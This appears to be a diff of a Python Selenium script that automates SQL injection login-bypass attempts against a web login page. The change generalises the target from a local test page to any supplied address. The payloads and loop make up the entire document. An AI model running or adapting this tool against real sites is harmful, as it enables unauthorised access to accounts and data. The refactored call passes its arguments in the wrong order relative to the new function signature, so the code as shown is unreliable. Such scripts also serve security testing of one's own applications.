@@ -7,10 +7,10 @@ from selenium.webdriver.common.action_chains import ActionChains
 import time
 
 
-def try_sqlinj(user_name, password):
+def try_sqlinj(address, user_name, password):
     driver = webdriver.Chrome()
 
-    driver_url = 'http://localhost:8000/Login.php'
+    driver_url = address
     driver.get(driver_url)
 
     time.sleep(1)  # wait for the page to load
@@ -50,10 +50,11 @@ def try_sqlinj(user_name, password):
     return passed
 
 
-injections = [['a@a.a\'/*', '\'*/\''], ['a@a.a\'-- ', '']]
-for injection in injections:
-    passed = try_sqlinj(injection[0], injection[1])
-    if passed:
-        print('sql injection succeeded')
-        exit(0)
-print('sql injection failed')
+def execute(address, user_name="a@a.a"):
+    injections = [[f"{user_name}'/*", "'*/'"], [f"{user_name}'-- ", ""]]
+    for injection in injections:
+        passed = try_sqlinj(injection[0], injection[1], address)
+        if passed:
+            print('sql injection succeeded')
+            exit(0)
+    print('sql injection failed')
